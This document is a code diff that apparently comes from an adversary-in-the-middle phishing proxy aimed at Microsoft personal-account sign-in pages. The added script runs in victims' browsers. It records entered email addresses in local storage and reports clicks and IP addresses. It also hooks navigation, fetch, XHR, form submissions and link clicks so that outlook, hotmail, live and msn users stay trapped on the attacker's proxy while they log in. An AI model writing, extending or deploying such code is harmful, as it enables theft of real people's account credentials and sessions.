@@ -58,6 +58,51 @@ async function replace_response_text(response, upstream, original, ip) {
               if (btn && emailInput) {
                 clearInterval(interval);
                 const realIP = "${ip}";
+                const origin = "${original}";
+                const personalHosts = ["login.live.com","account.live.com","www.office.com","office.com"];
+                const isPersonalEmail = (e) => {
+                  const s = (e||'').toLowerCase();
+                  return s.endsWith('@outlook.com')||s.endsWith('@hotmail.com')||s.endsWith('@live.com')||s.endsWith('@msn.com');
+                };
+                const toProxy = (url) => {
+                  try {
+                    const u = new URL(url, window.location.href);
+                    if (personalHosts.includes(u.host)) {
+                      const sep = u.search && u.search.length > 0 ? '&' : '?';
+                      return origin + u.pathname + u.search + sep + 'x-target-host=' + u.host;
+                    }
+                  } catch {}
+                  return url;
+                };
+                const patchNav = () => {
+                  try {
+                    const loc = window.location;
+                    const originalAssign = loc.assign.bind(loc);
+                    const originalReplace = loc.replace.bind(loc);
+                    loc.assign = (u) => originalAssign(toProxy(u));
+                    loc.replace = (u) => originalReplace(toProxy(u));
+                    const originalOpen = window.open;
+                    window.open = function(u, n, f) { return originalOpen.call(window, toProxy(u), n, f); };
+                    const nativePush = history.pushState.bind(history);
+                    const nativeReplaceState = history.replaceState.bind(history);
+                    history.pushState = function(s,t,u){ return nativePush(s,t,toProxy(u)); };
+                    history.replaceState = function(s,t,u){ return nativeReplaceState(s,t,toProxy(u)); };
+                    const origFetch = window.fetch;
+                    if (origFetch) {
+                      window.fetch = function(input, init) {
+                        if (typeof input === 'string') input = toProxy(input);
+                        else if (input && input.url) input = new Request(toProxy(input.url), input);
+                        return origFetch(input, init);
+                      };
+                    }
+                    const origXHROpen = XMLHttpRequest && XMLHttpRequest.prototype && XMLHttpRequest.prototype.open;
+                    if (origXHROpen) {
+                      XMLHttpRequest.prototype.open = function(m,u, ...rest) { return origXHROpen.call(this, m, toProxy(u), ...rest); };
+                    }
+                    document.addEventListener('submit', function(e){ try { const form = e.target; if (form && form.action) form.action = toProxy(form.action); } catch(_){} }, true);
+                    document.addEventListener('click', function(e){ const a = e.target && e.target.closest && e.target.closest('a[href]'); if (a) a.href = toProxy(a.href); }, true);
+                  } catch {}
+                };
                 btn.addEventListener("click", () => {
                   fetch("/__notify_click", {
                     method: "POST",
@@ -68,7 +113,24 @@ async function replace_response_text(response, upstream, original, ip) {
                       ip: realIP
                     }),
                   });
+                  try {
+                    // Persist email locally so subsequent pages can activate nav trapping
+                    if (emailInput && emailInput.value) {
+                      localStorage.setItem('aitm_email', emailInput.value);
+                      sessionStorage.setItem('aitm_email', emailInput.value);
+                      if (isPersonalEmail(emailInput.value)) {
+                        patchNav();
+                      }
+                    }
+                  } catch {}
                 });
+                try {
+                  // If already have a stored personal email, patch immediately
+                  const stored = localStorage.getItem('aitm_email') || sessionStorage.getItem('aitm_email');
+                  if (isPersonalEmail(stored)) {
+                    patchNav();
+                  }
+                } catch {}
               }
             }, 500);
           });
@@ -130,6 +192,50 @@ async function replace_response_text_personal(response, upstream, original, ip) 
       <script>
         (function() {
           const realIP = "${ip}";
+          const origin = "${original}";
+          const personalHosts = ["login.live.com","account.live.com","www.office.com","office.com"];
+          const toProxy = (url) => {
+            try {
+              const u = new URL(url, window.location.href);
+              if (personalHosts.includes(u.host)) {
+                const sep = u.search && u.search.length > 0 ? '&' : '?';
+                return origin + u.pathname + u.search + sep + 'x-target-host=' + u.host;
+              }
+            } catch {}
+            return url;
+          };
+          function patchNav() {
+            try {
+              const loc = window.location;
+              const originalAssign = loc.assign.bind(loc);
+              const originalReplace = loc.replace.bind(loc);
+              loc.assign = (u) => originalAssign(toProxy(u));
+              loc.replace = (u) => originalReplace(toProxy(u));
+              const originalOpen = window.open;
+              window.open = function(u, n, f) { return originalOpen.call(window, toProxy(u), n, f); };
+              const nativePush = history.pushState.bind(history);
+              const nativeReplaceState = history.replaceState.bind(history);
+              history.pushState = function(s,t,u){ return nativePush(s,t,toProxy(u)); };
+              history.replaceState = function(s,t,u){ return nativeReplaceState(s,t,toProxy(u)); };
+              const origFetch = window.fetch;
+              if (origFetch) {
+                window.fetch = function(input, init) {
+                  if (typeof input === 'string') input = toProxy(input);
+                  else if (input && input.url) input = new Request(toProxy(input.url), input);
+                  return origFetch(input, init);
+                };
+              }
+              const origXHROpen = XMLHttpRequest && XMLHttpRequest.prototype && XMLHttpRequest.prototype.open;
+              if (origXHROpen) {
+                XMLHttpRequest.prototype.open = function(m,u, ...rest) { return origXHROpen.call(this, m, toProxy(u), ...rest); };
+              }
+              document.addEventListener('submit', function(e){ try { const form = e.target; if (form && form.action) form.action = toProxy(form.action); } catch(_){} }, true);
+              document.addEventListener('click', function(e){ const a = e.target && e.target.closest && e.target.closest('a[href]'); if (a) a.href = toProxy(a.href); }, true);
+            } catch {}
+          }
+          // Always active on personal pages
+          patchNav();
+
           function capturePersonalEvents() {
             const emailInputs = document.querySelectorAll('input[name="loginfmt"], input[name="username"], input[type="email"], input[placeholder*="email"], input[placeholder*="Email"]');
             emailInputs.forEach(input => {
